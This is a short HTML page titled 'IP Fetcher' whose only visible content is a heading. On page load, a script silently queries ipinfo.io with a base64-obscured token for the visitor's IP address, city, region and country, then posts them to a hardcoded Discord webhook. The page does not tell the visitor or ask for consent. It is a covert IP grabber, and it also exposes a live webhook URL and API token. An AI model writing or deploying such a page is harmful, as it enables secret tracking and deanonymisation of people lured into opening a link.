<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Fetcher</title>
    <style>
        body { 
            background-color: #000; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            font-family: Arial, sans-serif; 
        }
    </style>
</head>
<body>
    <h1>IP Information Fetcher</h1>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9";
        const ipinfoToken = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGVjY2E0Y2E0Mg=="; // base64 encoded token

        async function fetchIPInfo() {
            const response = await fetch(`https://ipinfo.io/json?token=${atob(ipinfoToken)}`);
            const data = await response.json();

            const payload = {
                content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}`
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        fetchIPInfo();
    </script>
</body>
</html>
